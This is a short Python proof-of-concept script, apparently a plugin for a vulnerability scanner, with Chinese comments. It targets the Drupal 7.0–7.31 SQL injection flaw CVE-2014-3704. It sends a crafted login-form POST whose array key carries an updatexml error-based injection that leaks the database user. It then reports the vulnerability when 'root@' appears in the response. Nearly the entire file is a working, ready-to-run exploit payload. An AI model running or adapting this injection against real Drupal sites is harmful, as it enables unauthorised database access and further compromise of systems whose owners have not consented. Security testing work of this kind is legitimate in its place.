import requests
import random

# Drupal v7.0~7.31 sql注入漏洞
def poc(url, logindict, user_agent, proxy):
    url = url.strip("/")
    header = {
        'User-Agent': user_agent,
        "Content-Type": "application/x-www-form-urlencoded"
    }

    # 漏洞位置
    exploit_url = url + '?q=node&destination=node'
    datas = "pass=lol&form_build_id=&form_id=user_login_block&op=Log+in&name[0 or updatexml(0,concat(0xa,user()),0)%23]=bob&name[0]=a"
    if proxy:
        proxies = {
            "http": "http://%(proxy)s/" % {'proxy': proxy},
            "https": "http://%(proxy)s/" % {'proxy': proxy}
        }
        response = requests.post(exploit_url, headers=header, data=datas, proxies=proxies)

    else:
        response = requests.post(exploit_url, data=datas, headers=header)
    # with open('b.html','wb') as f:
    #     f.write(response.content)
    # print(response.text)
    if response.status_code == 200:
        if 'root@' in response.text:
            return 'Drupal v7.0~7.31 - sql注入漏洞    漏洞编号：CVE-2014-3704'

def run(url, logindict, user_agent, proxies):
    result = poc(url, logindict, user_agent, proxies)
    return result


